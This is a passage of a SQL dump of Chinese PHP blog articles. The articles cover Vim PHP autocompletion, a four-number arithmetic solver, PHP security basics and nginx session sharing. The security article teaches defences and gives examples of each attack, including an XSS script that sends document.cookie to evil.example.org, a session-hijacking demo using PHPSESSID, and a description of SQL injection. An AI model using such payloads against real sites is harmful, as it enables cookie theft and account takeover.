href=&quot;http://svn.php.net/viewvc/phpdoc/doc-base/trunk/funclist.txt?view=co&quot;&gt;http://svn.php.net/viewvc/phpdoc/doc-base/trunk/funclist.txt?view=co&lt;/a&gt;&lt;br /&gt;&lt;br /&gt;复制上面的函数列表到~/.vim/dict/php_function_list.txt里去。&lt;br /&gt;&lt;br /&gt;最后编辑~/.gvimrc文件，在最后加入一行代码：&lt;br /&gt;&lt;br /&gt;&lt;span style=&quot;color:#cc0000&quot;&gt;au FileType php setlocal dict+=~/.vim/dict/php_function_list.txt&lt;/span&gt;&lt;/p&gt;&lt;p&gt;然后在编辑php文件时可以用ctrl+x, ctrl+o自动补全&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;.gvimrc配置文件：&lt;a target=&quot;_blank&quot; href=&quot;http://blog.csdn.net/luochuan/article/details/7252916&quot;&gt;http://blog.csdn.net/luochuan/article/details/7252916&lt;/a&gt;&lt;/p&gt;&lt;p&gt;colorscheme-laphp.vim插件：&lt;a target=&quot;_blank&quot; href=&quot;http://blog.csdn.net/luochuan/article/details/7250163&quot;&gt;http://blog.csdn.net/luochuan/article/details/7250163&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;', 1386770259),
(25, 25, '&lt;p&gt;将给定的四个数做四则运算，每个数只能用一次，结果得到给定的值，求该运算表达式&lt;/p&gt;鸟哥的微博上看来的，代码如下：&lt;pre class=&quot;brush:php;toolbar:false;&quot;&gt;&amp;lt;?php \r\n/**\r\n * 将给定的四个数做四则运算，每个数只能用一次，结果得到给定的值，求该运算表达式\r\n * by wbq 2012-2-14\r\n * $n：数组四个数可以是任意0-99\r\n * $r：要运算的结果值\r\n */ \r\n$n = array(1,2,3,4); \r\n$r = 30; \r\n             \r\n$m = 0; \r\n$l = count($n); \r\nget41($n,$l); \r\n             \r\nif (!$m) echo &quot;无法计算!&quot;; \r\n             \r\n/**\r\n * 执行四则运算的主方法-递归方法\r\n * @param $n 要操作的数的数组，数可以为表达式\r\n * @param $l 该数组的有意义的元素的个数\r\n */ \r\nfunction get41($n,$l) \r\n{ \r\n    global $r; \r\n             \r\n    if ($l == 1) { \r\n        /**\r\n         * 构造php语句，并eval执行表达式，如果返回给定值，则打印表达式并退出\r\n         */ \r\n        $result = &#039;return &#039; . $n[0] . &#039;;&#039;; \r\n        if (abs(eval($result)) == $r) { \r\n            $m = 1; \r\n            echo $n[0].&quot;=&quot;.$r; exit; \r\n        } \r\n    } \r\n    for ($i= 0; $i&amp;lt; $l; $i++) { \r\n        for ($j= $i+1; $j&amp;lt; $l; $j++) { \r\n            /**\r\n             * 获取当前要进行四则运算的两个数\r\n             * $n[$i]和它的下一个数$n[$j]\r\n             */ \r\n            $nl = $n[$i]; \r\n            $nr = $n[$j]; \r\n             \r\n            /**\r\n             * 将当前数与其下一个数的四则运算表达式push入$n数组的第$i个元素内\r\n             * 将$n数组的最后一个元素push入$n数组的第$i+1($j)个元素内\r\n             * 并将$l的值-1(由于最后一个元素已经push入前面的元素中，所以有意义的元素个数要-1)\r\n             * 然后递归调用get41\r\n             */ \r\n            $n[$i] = &#039;(&#039;.$nl.&#039;+&#039;.$nr.&#039;)&#039;; \r\n            $n[$j] = $n[$l-1]; \r\n            get41($n,$l-1); \r\n             \r\n            $n[$i] = &#039;(&#039;.$nl.&#039;-&#039;.$nr.&#039;)&#039;; \r\n            $n[$j] = $n[$l-1]; \r\n            get41($n,$l-1); \r\n             \r\n            $n[$i] = &#039;(&#039;.$nr.&#039;-&#039;.$nl.&#039;)&#039;; \r\n            $n[$j] = $n[$l-1]; \r\n            get41($n,$l-1); \r\n             \r\n            $n[$i] = &#039;(&#039;.$nl.&#039;*&#039;.$nr.&#039;)&#039;; \r\n            $n[$j] = $n[$l-1]; \r\n            get41($n,$l-1); \r\n             \r\n            if ($nr != 0) { \r\n                $n[$i] = &#039;(&#039;.$nl.&#039;/&#039;.$nr.&#039;)&#039;; \r\n                $n[$j] = $n[$l-1]; \r\n                get41($n,$l-1); \r\n            } \r\n             \r\n            if ($nl != 0) { \r\n                $n[$i] = &#039;(&#039;.$nr.&#039;/&#039;.$nl.&#039;)&#039;; \r\n                $n[$j] = $n[$l-1]; \r\n                get41($n,$l-1); \r\n            } \r\n             \r\n            /**\r\n             * 如果下一层递归返回false，代表未找到表达式\r\n             * 则还原$n数组，$n[$i] = $nl; $n[$j] = $nr;\r\n             * 并进入下一次的for+$j循环体\r\n             */ \r\n            $n[$i] = $nl; \r\n            $n[$j] = $nr; \r\n        } \r\n    } \r\n                 \r\n    return false; \r\n}&lt;/pre&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;参考链接：&lt;/p&gt;&lt;p&gt;4个数字求值：&lt;a target=&quot;_blank&quot; href=&quot;http://www.laruence.com/stashes/compute.php&quot;&gt;http://www.laruence.com/stashes/compute.php&lt;/a&gt;&lt;/p&gt;代码24.php：&lt;a target=&quot;_blank&quot; href=&quot;https://github.com/laruence/laruence.github.com/tree/master/php-gtk-example&quot;&gt;https://github.com/laruence/laruence.github.com/tree/master/php-gtk-example&lt;/a&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;', 1386770517),
(26, 26, '&lt;p&gt;&lt;strong&gt;&lt;span style=&quot;font-size:18px&quot;&gt;PHP安全基础注意事项：&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#000000&quot;&gt;1、关闭全局变量注册register_globals&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#000000&quot;&gt;2、开启错误报告，开发环境上设置错误报告级别为E_ALL | E_STRICT，生产环境关闭错误报告，同时，PHP提供了set_error_handler( )方法，该方法允许用户定义自己的出错处理函数&lt;/span&gt;&lt;/p&gt;&lt;pre class=&quot;brush:php;toolbar:false;&quot;&gt;&amp;lt;?php \r\nset_error_handler(&quot;my_error_handler&quot;; \r\nfunction my_error_handler($number, $string, $file, $line, $context) \r\n{ \r\n    /** function body */ \r\n}&lt;/pre&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size:18px&quot;&gt;&lt;strong&gt;PHP安全基本原则：&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;1、不相信任何输入数据的正确性。&lt;/p&gt;&lt;p&gt;2、深度防范，这要求您时刻有一个备份方案。如果一个安全措施失效了，必须有另外一个提供一些保护。&lt;/p&gt;&lt;p&gt;3、最小权限，合理的分配每个用户所拥有的权限，可以有效的避免攻击。&lt;/p&gt;&lt;p&gt;4、简单就是美，复杂滋生错误，错误能导致安全漏洞。&lt;/p&gt;&lt;p&gt;5、暴露最小化，PHP应用程序需要与外部（主要是客户端浏览器、数据库等）数据源间进行频繁的通信，如果你正确的跟踪数据，你就可以确定哪些数据被暴露了。数据暴露不一定就意味着安全风险。可是数据暴露必须尽量最小化。例如用SSL保护信用卡信息等。&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size:18px&quot;&gt;&lt;strong&gt;PHP安全基本方法：&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;1、平衡风险与可用性，用户操作的友好性与安全措施是一对矛盾，在提高安全性的同时，通常会降低可用性，所以，你必须在这两者之间做一个平衡。&lt;/p&gt;&lt;p&gt;2、跟踪数据，PHP通过超级全局数组如$_GET, $_POST, $_REQUEST, $_SESSION及$_COOKIE等清楚地表示了用户数据的来源，强烈建议开发者在编写代码时严格根据数据来源使用不同的方法获取数据。&lt;/p&gt;&lt;p&gt;3、过滤输入，trim，preg_match正则表达式以及ctype_alnum等内置方法。&lt;/p&gt;&lt;p&gt;4、转义输出，htmlspecialchars，htmlentities等，此外还有sql语句(mysql)的数据转义方法mysql_real_escape_string()&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size:18px&quot;&gt;&lt;strong&gt;常见攻击方式及防御措施：&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;1、表单及URL攻击，注意表单中的隐藏域限制条件，URL中的参数改变，遵循深度防范原则。&lt;/p&gt;&lt;p&gt;2、文件上传攻击，需要在form声明里指定enctype=&amp;quot;multipart/form-data&amp;quot;，需要注意隐藏的表单域限制条件的判断，注意用is_uploaded_file(), move_uploaded_file()确保文件来源的安全，同时用filesize, getimagesize等方法校验文件大小。&lt;/p&gt;&lt;p&gt;3、跨站脚本攻击，所有可以让客户端输入的应用都面临风险&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#339999&quot;&gt;例子：下面的例子允许用户发表评论&lt;/span&gt;&lt;/p&gt;&lt;pre class=&quot;brush:html;toolbar:false;&quot;&gt;&amp;lt;form action=&quot;comment.php&quot; method=&quot;POST&quot; /&amp;gt; \r\n&amp;lt;p&amp;gt;Name: &amp;lt;input type=&quot;text&quot; name=&quot;name&quot; /&amp;gt;&amp;lt;br /&amp;gt; \r\nComment: &amp;lt;textarea name=&quot;comment&quot; rows=&quot;10&quot; cols=&quot;60&quot;&amp;gt;&amp;lt;/textarea&amp;gt;&amp;lt;br /&amp;gt; \r\n&amp;lt;input type=&quot;submit&quot; value=&quot;Add Comment&quot; /&amp;gt;&amp;lt;/p&amp;gt; \r\n&amp;lt;/form&amp;gt;&lt;/pre&gt;&lt;pre class=&quot;brush:php;toolbar:false;&quot;&gt;&amp;lt;?php \r\necho &quot;&amp;lt;p&amp;gt;$name writes:&amp;lt;br /&amp;gt;&quot;; \r\necho &quot;&amp;lt;blockquote&amp;gt;$comment&amp;lt;/blockquote&amp;gt;&amp;lt;/p&amp;gt;&quot;; \r\n?&amp;gt;&lt;/pre&gt;&lt;p&gt;&lt;br /&gt;&lt;span style=&quot;color:#339999&quot;&gt;在上面的代码里，服务器端的php代码没有对用户输入的内容进行过滤及转义输出，如果我们在评论内容中输入以下内容&lt;/span&gt;&lt;/p&gt;&lt;pre class=&quot;brush:js;toolbar:false;&quot;&gt;&amp;lt;script&amp;gt; \r\ndocument.location = &#039;http://evil.example.org/steal.php?cookies=&#039; + document.cookie \r\n&amp;lt;/script&amp;gt;&lt;/pre&gt;&lt;p&gt;&lt;span style=&quot;color:#339999&quot;&gt;服务器将未经过转义的内容(javascript代码)输出到客户端，那么其他的用户在访问这个页面时，就会不知不觉的把自己的cookies发送到evil.example.org，而接收程序steal.php可以通过$_GET[&amp;#39;cookies&amp;#39;]变量防问所有的cookies。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#cc0000&quot;&gt;防御措施：针对上面的攻击方式，我们要严格的将我们要输出到客户端的数据进行转义htmlentities(&amp;#39;comment&amp;#39;, ENT_QUOTES, &amp;#39;UTF-8&amp;#39;)&lt;/span&gt;&lt;/p&gt;&lt;p&gt;4、跨站请求伪造，跨站请求伪造(CSRF)是一种允许攻击者通过受害者发送任意HTTP请求的一类攻击方法。此处所指的受害者是一个不知情的同谋，所有的伪造请求都由他发起，而不是攻击者。这样，很你就很难确定哪些请求是属于跨站请求伪造攻击。跨站攻击一般是用图片或者iframe等隐藏http请求（伪造）第三方网站，来攻击或者破坏第三方网站的信息。&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#cc0000&quot;&gt;小提示：&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#339999&quot;&gt;当你访问&lt;a href=&quot;http://www.google.com&quot;&gt;http://www.google.com&lt;/a&gt;，你的浏览器首先会请求这个URL所标识的资源。你可以通过查看该页的源文件（HTML）的方式来看到该请求的返回内容。在浏览器解析了返回内容后发现了Google的标志图片。这个图片是以HTML的img标签表示的，该标签的src属性表示了图片的URL。浏览器于是再发出对该图片的请求，以上这两次请求间的不同点只是URL的不同。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#339999&quot;&gt;根据上面的原理，跨站请求伪造攻击可以通过img标签来实现。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#cc0000&quot;&gt;防御措施：使用POST而不是GET来提交表单，在处理表单提交时使用$_POST而不是$_REQUEST，同时需要在重要操作时进行验证（越是方便，风险越大，你需要求得方便与风险之间的平衡）。对于重要的表单，请加验证码识别。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;5、欺骗表单提交，大多数表单用一个相对URL地址来指定action属性，攻击者可以在任意地方编辑表单，然后将数据提交给你服务器的绝对地址。&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#cc0000&quot;&gt;防御措施：欺骗表单攻击是无法防御的，在服务器验证端加入HTTP_REFERER的判断，可以部分防止欺骗表单，但是这个值是可以伪造的，不能绝对防止。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;6、HTTP请求欺骗，攻击者可以用telnet等程序，来连接网站服务器的侦听端口(一般为80)来与web服务器直接通信，当然实现这种通信的方式很多，像php的fsockopen方式就是一种很方便的通信手段。&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#cc0000&quot;&gt;防御措施：严格正确的过滤输入信息，转义输出数据。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;7、数据库及SQL注入，作为一门强大的网络编程语言，PHP可以与oracle、mysql、SQLite等数据库进行连接。&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#339999&quot;&gt;&ldquo;很多PHP开发人员不会去过滤来自数据库的数据，他们认为数据库内保存的是已过滤的数据。虽然这种做法的安全风险是很小的，但是这不是最好的做法，同时我也不推荐这样做。这种做法是基于对数据库安全的绝对信任，但同时违反了深度防范的原则。如果恶意数据由于某些原因被注入了数据库，如果你有过滤机制的话，就能发现并抓住它。&rdquo;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;关于SQL注入的例子网上有很多了，就不列举了，最基本最常见的莫过于用户名/密码中加&amp;#39; 和or 条件，或者加--sql语句注释符号。&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#cc0000&quot;&gt;防御措施：严格正确的过滤输入信息，转义输出数据，同时用mysql_real_escape_string()格式化sql的字段匹配值，或者用addslashes()格式化输入数据。另外，使用参数化sql语句，这样输入的内容就只会作为数据来处理，也可以降低SQL注入风险。&lt;/span&gt;&lt;/p&gt;&lt;pre class=&quot;brush:php;toolbar:false;&quot;&gt;&amp;lt;?php \r\n$sql = &#039;INSERT \r\nINTO user (last_name) \r\nVALUES (?)&#039;;  \r\n$dbh-&amp;gt;query($sql, array($clean[&#039;last_name&#039;])); \r\n?&amp;gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;&lt;span style=&quot;font-size:18px&quot;&gt;PHP的SESSION与Cookies&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;众所周知，HTTP是一种无状态的协议。客户端向服务器发送一次请求，服务器接收并返回客户端数据，这样一次HTTP请求就结束了。由于协议中未提供任何让客户端标识自己的方法，因此服务器也就无法区分客户端。&lt;/p&gt;&lt;p&gt;Cookies是对HTTP协议的补充，它们由两个HTTP头部组成：Set-Cookie响应头部和Cookie请求头部。当客户端发出对一个特定URL的请求时，服务器会在响应时选择包含一个Set-Cookie头部。它要求客户端在下面的请求中包含一个相就的Cookie头部。基本的交互过程如下图：&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/uploads/Image/201312/11/1386771089_yqknce_6048_0_1329746616vv7O.gif.jpg&quot; title=&quot;0_1329746616vv7O.gif.jpg&quot; /&gt;&lt;/p&gt;&lt;p&gt;如图所示，当浏览器向服务器发出HTTP请求时，其请求信息包含cookie，服务器就可以识别该客户端，并将该客户端所有的请求连接起来。&lt;/p&gt;&lt;p&gt;Session又称为会话，一般我们使用PHP的内置session机制。&lt;/p&gt;&lt;p&gt;&lt;strong&gt;&lt;span style=&quot;font-size:18px&quot;&gt;常见的基于cookie和session的攻击方式：&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;1、cookie盗窃，由于cookie是存储在客户端的信息，一旦cookie信息暴露，就会导致会话劫持。常见的盗窃cookie信息的手段是浏览器漏洞和跨站脚本攻击。&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#cc0000&quot;&gt;防御措施：做好输入数据的过滤，输出数据的转义。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;2、session数据暴露，由于session是存储在服务器端的，我们做好了服务器的安全工作，session数据不会公开暴露，同时我们也可以用session_set_save_handler( )来定义自己的加密方法，以保护我们的session数据。&lt;/p&gt;&lt;p&gt;3、会话劫持，攻击者取得一个合法的会话标识来伪装成合法用户，以此来骗取服务器的信任，并对服务器进行攻击操作的手段。&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#339999&quot;&gt;例子：攻击者劫持了受害者用户的session标识id，可以任意修改属于该会话标识的会话数据&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;http://localhost/index.php&quot;&gt;http://localhost/index.php&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;pre class=&quot;brush:php;toolbar:false;&quot;&gt;&amp;lt;?php \r\nsession_start(); \r\n//$_SESSION[&#039;n&#039;] = 10; \r\necho $_SESSION[&#039;n&#039;];&lt;/pre&gt;&lt;p&gt;&lt;a href=&quot;http://localhost/attack.php?PHPSESSID=1234&quot;&gt;http://localhost/attack.php?PHPSESSID=1234&lt;/a&gt;&lt;br /&gt;&lt;/p&gt;&lt;pre class=&quot;brush:php;toolbar:false;&quot;&gt;&amp;lt;?php \r\nsession_start(); \r\n$_SESSION[&#039;n&#039;] = 20;&lt;/pre&gt;&lt;p&gt;&lt;span style=&quot;color:#339999&quot;&gt;用户访问index.php，session启动，注册了session_id，假设id值为1234，当然php的session_id不会是这么简单，并且向$_SESSION数组添加了一个值为10的变量n，并输出n的值为10，如果攻击者劫持了该会话，并获得了其PHPSESSID，那么攻击者就可以访问attack.php?PHPSESSID=1234连接，从而将该标识的用户的n值改为20，这时刷新index.php，输出n的值为20,，这就是一次最简单的会话劫持攻击。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#cc0000&quot;&gt;防御措施：在url后面加随机串，获取随机串的值之后计算md5散列，然后比较服务器上的存储值，或者用比较HTTP_USER_AGENT的方式，如果用户发送了一个非常用的USER_AGENT请求，那么可以将该请求作为可疑请求，并采取措施。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;', 1386771161),
(27, 27, '&lt;p&gt;&lt;span style=&quot;font-size:14px;font-family:微软雅黑,microsoft yahei;&quot;&gt;PHP服务器有多台，用nginx做负载均衡，这样同一个IP访问同一个页面会被分配到不同的服务器上，如果session不同步的话，就会出现很多问题，比如说最常见的登录状态，下面提供了几种方式来解决session共享的问题：&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-family:arial,helvetica,simsun,u5b8bu4f53;color:#638a4e;line-height:22px;font-size:14px&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;http://butian.org/knowledge/network/2254.html#%E5%BA%94%E7%94%A8%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%87%AA%E8%A1%8C%E5%AE%9E%E7%8E%B0%E5%85%B1%E4%BA%AB&quot; style=&quot;line-height:22px;color:#276904;text-decoration:none&quot;&gt;&lt;span style=&quot;font-size:13px;color:#cc0000&quot;&gt;&lt;strong&gt;&lt;span style=&quot;line-height:22px;text-decoration:none;color:#CC0000;font-size:14px;font-family:微软雅黑,microsoft yahei;&quot;&gt;1、不使用session，换用cookie&lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/a&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size:14px;font-family:微软雅黑,microsoft yahei;&quot;&gt;session是存放在服务器端的，cookie是存放在客户端的，我们可以把用户访问页面产生的session放到cookie里面，就是以cookie为中转站。你访问web服务器A，产生了session然后把它放到cookie里面，当你的请求被分配到B服务器时，服务器B先判断服务器有没有这个session，如果没有，再去看看客户端的cookie里面有没有这个session，如果也没有，说明session真的不存，如果cookie里面有，就把cookie里面的sessoin同步到服务器B，这样就可以实现session的同步了。&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;line-height:22px;margin:0px 0px 10px;padding:0px;&quot;&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size:14px;font-family:微软雅黑,microsoft yahei;&quot;&gt;说明：这种方法实现起来简单，方便，也不会加大数据库的负担，但是如果客户端把cookie禁掉了的话，那么session就无从同步了，这样会给网站带来损失；cookie的安全性不高，虽然它已经加了密，但是还是可以伪造的。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;br style=&quot;line-height:22px&quot; /&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size:13px&quot;&gt;&lt;strong&gt;&lt;span style=&quot;color:#CC0000;font-size:14px;font-family:微软雅黑,microsoft yahei;&quot;&gt;2、session存在数据库（MySQL等）中&lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size:14px;font-family:微软雅黑,microsoft yahei;&quot;&gt;PHP可以配置将session保存在数据库中，这种方法是把存放session的表和其他数据库表放在一起，如果mysql也做了集群了话，每个mysql节点都要有这张表，并且这张session表的数据表要实时同步。&lt;br /&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size:14px;font-family:微软雅黑,microsoft yahei;&quot;&gt;说明：用数据库来同步session，会加大数据库的IO，增加数据库的负担。而且数据库读写速度较慢，不利于session的适时同步。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size:13px&quot;&gt;&lt;strong&gt;&lt;span style=&quot;color:#CC0000;font-size:14px;font-family:微软雅黑,microsoft yahei;&quot;&gt;3、session存在memcache或者redis中&lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size:14px;font-family:微软雅黑,microsoft yahei;&quot;&gt;memcache可以做分布式，php配置文件中设置存储方式为memcache，这样php自己会建立一个session集群，将session数据存储在memcache中。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size:14px;font-family:微软雅黑,microsoft yahei;&quot;&gt;说明：以这种方式来同步session，不会加大数据库的负担，并且安全性比用cookie大大的提高，把session放到内存里面，比从文件中读取要快很多。但是memcache把内存分成很多种规格的存储块，有块就有大小，这种方式也就决定了，memcache不能完全利用内存，会产生内存碎片，如果存储块不足，还会产生内存溢出。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;span style=&quot;color:#cc0000&quot;&gt;&lt;strong&gt;&lt;span style=&quot;color:#CC0000;font-size:14px;font-family:微软雅黑,microsoft yahei;&quot;&gt;4&lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;a href=&quot;http://butian.org/knowledge/network/2254.html#ip_hash&quot; style=&quot;line-height:22px;color:#276904;text-decoration:none&quot;&gt;&lt;span style=&quot;color:#cc0000&quot;&gt;&lt;strong&gt;&lt;span style=&quot;line-height:22px;text-decoration:none;color:#CC0000;font-size:14px;font-family:微软雅黑,microsoft yahei;&quot;&gt;、ip_hash&lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size:14px;font-family:微软雅黑,microsoft yahei;&quot;&gt;nginx中的ip_hash技术能够将某个ip的请求定向到同一台后端应用服务器，这样一来这个ip下的某个客户端和某个后端就能建立起稳固的session，ip_hash是在upstream配置中定义的：&lt;/span&gt;&lt;/p&gt;&lt;pre class=&quot;brush:plain;toolbar:false;&quot;&gt;upstream backend {\r\n    server 127.0.0.1:8001;\r\n    server 127.0.0.1:8002;\r\n    ip_hash;\r\n}&lt;/pre&gt;&lt;p&gt;&lt;span style=&quot;font-size:14px;font-family:微软雅黑,microsoft yahei;&quot;&gt;说明：因为这种方式只能用IP来分配后端，所以要求nginx一定要是最前端的服务器，否则nginx会取不到真实的客户端ip，那ip_hash就失效了。例如在服务器架构中使用squid做前端高速缓存，那么nginx取到的就是squid服务器的ip，用这个ip来做ip_hash肯定是不对的。再有，如果nginx的后端还有其他的负载均衡，将请求又分流了，那么对于某个客户端的请求，肯定不能定位到同一台应用服务器（例如php的fast-cgi服务器等），这样也不能做到session共享，如果在nginx后面再做负载均衡，我们可以再搭一台squid，然后再直接到应用服务器，或者用 location作一次分流，将需要session的部分请求通过ip_hash分流，剩下的走其它后端。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;br style=&quot;line-height:22px&quot; /&gt;&lt;span style=&quot;color:#CC0000;font-size:14px;font-family:微软雅黑,microsoft yahei;&quot;&gt;5&lt;/span&gt;&lt;a href=&quot;http://butian.org/knowledge/network/2254.html#upstream_hash&quot; style=&quot;line-height:22px;color:#276904;text-decoration:none&quot;&gt;&lt;strong&gt;&lt;span style=&quot;color:#CC0000;font-size:14px;font-family:微软雅黑,microsoft yahei;&quot;&gt;、upstream_hash&lt;/span&gt;&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size:14px;font-family:微软雅黑,microsoft yahei;&quot;&gt;upstream_hash 是nginx 的一个第三方模块，支持采用nginx 内部的各种变量作hash，然后针对生成的hash 值，用求余的方式分布到后端（backend）服务器上，达到负载均衡的目的。该模块一般情况下是用做url_hash的，但是也可以做session共享。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size:14px;font-family:微软雅黑,microsoft yahei;&quot;&gt;假如前端是squid，他会将ip加入x_forwarded_for这个http_header里，用upstream_hash可以用这个头做因子，将请求定向到指定的后端：&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size:14px;font-family:微软雅黑,microsoft yahei;&quot;&gt;可见这篇文档：&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;a style=&quot;font-size:14px;text-decoration:underline;&quot; href=&quot;http://www.oschina.net/discuss/thread/622&quot; target=&quot;_blank&quot;&gt;&lt;span style=&quot;font-size:14px;font-family:微软雅黑,microsoft yahei;&quot;&gt;http://www.oschina.net/discuss/thread/622&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size:14px;font-family:微软雅黑,microsoft yahei;&quot;&gt;在文档中是使用$request_uri做因子，稍微改一下：&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size:14px;font-family:微软雅黑,microsoft yahei;&quot;&gt;hash $http_x_forwarded_for;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size:14px;font-family:微软雅黑,microsoft yahei;&quot;&gt;这样就改成了利用x_forwarded_for这个头作因子，在nginx新版本中可支持读取cookie值，所以也可以改成：&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size:14px;font-family:微软雅黑,microsoft yahei;&quot;&gt;hash $cookie_jsessionid;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size:14px;font-family:微软雅黑,microsoft yahei;&quot;&gt;假如在php中配置的session为无cookie方式，配合nginx自己的一个userid_module模块就可以用nginx自发一个cookie，可参见userid模块的英文文档：&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;a style=&quot;font-size:14px;text-decoration:underline;&quot; href=&quot;http://wiki.nginx.org/NginxHttpUserIdModule&quot; target=&quot;_blank&quot;&gt;&lt;span style=&quot;font-size:14px;font-family:微软雅黑,microsoft yahei;&quot;&gt;http://wiki.nginx.org/NginxHttpUserIdModule&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size:14px;font-family:微软雅黑,microsoft yahei;&quot;&gt;参考链接：&lt;/span&gt;&lt;a style=&quot;font-size:14px;text-decoration:underline;&quot; href=&quot;http://www.51testing.com/?uid-116228-action-viewspace-itemid-238672&quot; target=&quot;_blank&quot;&gt;&lt;span style=&quot;font-size:14px;font-family:微软雅黑,microsoft yahei;&quot;&gt;http://www.51testing.com/?uid-116228-action-viewspace-itemid-238672&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;', 1386771507);
INSERT INTO `la_article` (`id`, `archiveid`, `content`, `updatetime`) VALUES
